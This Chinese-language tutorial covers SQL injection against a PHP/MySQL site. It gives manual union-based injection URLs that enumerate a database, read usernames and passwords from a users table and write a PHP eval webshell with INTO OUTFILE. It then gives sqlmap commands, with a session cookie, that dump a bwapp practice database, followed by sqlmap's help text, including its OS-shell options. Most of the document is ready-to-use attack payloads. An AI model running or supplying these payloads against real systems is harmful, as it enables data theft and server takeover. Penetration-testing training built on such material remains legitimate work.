---
title: PHP手工注入以及通过SqlMap自动注入基本语法
tags: [PHP,SqlMap,MySQL,SQL注入]
---

### 0x00: 手工注入
#### 判断是否存在注入
``` bash
http://test.com/detail.php?movie=1 and 1=1 页面正常
```
``` bash
http://test.com/detail.php?movie=1 and 1=2 页面异常
```
#### 暴露基本信息
``` bash
http://test.com/detail.php?movie=1 order by 8 错误
```
>Tips: [ORDER BY {col_name | expr | position} [ASC | DESC], …],这里传入的是position排序，根据某个potion排序，当超过表字段数量时就会报错。

``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 1,2,3,4,5,6,7
```
>Tips：http://test.com/detail.php?movie=1 and 1=2返回空，最后返回union select 1,2,3,4,5,6,7一条记录

#### 查看目标基本信息
``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(database(),0x20,user(),0x20,@@version,0x20,@@basedir,0x20,@@datadir,0x20,current_user),3,4,5,6,7
```
>Tips：0x20作为单字节表示，可以用于字符型变量的赋值，用于char时，其代表ascii码值0x20，即字符空格’ ‘，这里用于区分database()等字段回显信息。

#### 获取当前数据库所有表
``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(TABLE_NAME),3,4,5,6,7 from information_schema.tables where table_schema=database()
```
>Tips：MySQL所有数据库表都会存储于information_schema库中的tables表中。table_schema为数据库名称，TABLE_NAME为对应数据库表名称。
``` bash
-- 查看数据库所有表
select TABLE_NAME from information_schema.tables
```
#### 获取对应表的所有列
``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema=database() and table_name="users"
```
> Tips：MySQL所有数据库列都会存储于information_schemacolumnstable_schema为数据库名称，table_name为对应数据库表名称。
``` bash
-- 查看数据库所有列
select column_name from information_schema.columns
```

#### 获取对应列数据
``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 1,group_concat(id,login,password,email),3,4,5,6,7 from users
```

#### 写入poc脚本文件
``` bash
http://test.com/detail.php?movie=1 and 1=2 union select 0x20,0x20,0x20,0x20,0x20,0x20,"<?php @eval($_POST[cmd]); ?>" into outfile "/poc.php"
```
>Tips: into outfile通过SQL命令向服务器对应路径写入文件内容，通常用来写入webshell到Web服务目录。

### 0x02：SqlMap自动注入

#### 是否存在注入
``` bash
sqlmap -u http://test.com/detail.php?movie=1
```

#### 获取数据库
``` bash
sqlmap -u http://test.com/detail.php?movie=1 --cookie="security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2" --current-db
```

#### 获取数据库表
``` bash
sqlmap -u http://test.com/detail.php?movie=1 --cookie="security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2" -D bwapp --tables
```

#### 获取数据库表列
``` bash
sqlmap -u http://test.com/detail.php?movie=1 --cookie="security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2" -T users --columns
```

#### 获取数据库表数据
``` bash
sqlmap -u http://test.com/detail.php?movie=1 --cookie="security_level=0; PHPSESSID=uovrdlujopr4jbd44p4afjavv2" -T users --columns --dump
```

### SqlMap参数参考
```
Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

Target:
  At least one of these options has to be provided to define the
  target(s)

  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
  -g GOOGLEDORK       Process Google dork results as target URLs

Request:
  These options can be used to specify how to connect to the target URL

  --data=DATA         Data string to be sent through POST (e.g. "id=1")
  --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
  --random-agent      Use randomly selected HTTP User-Agent header value
  --proxy=PROXY       Use a proxy to connect to the target URL
  --tor               Use Tor anonymity network
  --check-tor         Check to see if Tor is used properly

Injection:
  These options can be used to specify which parameters to test for,
  provide custom injection payloads and optional tampering scripts

  -p TESTPARAMETER    Testable parameter(s)
  --dbms=DBMS         Force back-end DBMS to provided value

Detection:
  These options can be used to customize the detection phase

  --level=LEVEL       Level of tests to perform (1-5, default 1)
  --risk=RISK         Risk of tests to perform (1-3, default 1)

Techniques:
  These options can be used to tweak testing of specific SQL injection
  techniques

  --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

Enumeration:
  These options can be used to enumerate the back-end database
  management system information, structure and data contained in the
  tables. Moreover you can run your own SQL statements

  -a, --all           Retrieve everything
  -b, --banner        Retrieve DBMS banner
  --current-user      Retrieve DBMS current user
  --current-db        Retrieve DBMS current database
  --passwords         Enumerate DBMS users password hashes
  --tables            Enumerate DBMS database tables
  --columns           Enumerate DBMS database table columns
  --schema            Enumerate DBMS schema
  --dump              Dump DBMS database table entries
  --dump-all          Dump all DBMS databases tables entries
  -D DB               DBMS database to enumerate
  -T TBL              DBMS database table(s) to enumerate
  -C COL              DBMS database table column(s) to enumerate

Operating system access:
  These options can be used to access the back-end database management
  system underlying operating system

  --os-shell          Prompt for an interactive operating system shell
  --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

General:
  These options can be used to set some general working parameters

  --batch             Never ask for user input, use the default behavior
  --flush-session     Flush session files for current target

Miscellaneous:
  --sqlmap-shell      Prompt for an interactive sqlmap shell
  --wizard            Simple wizard interface for beginner users
```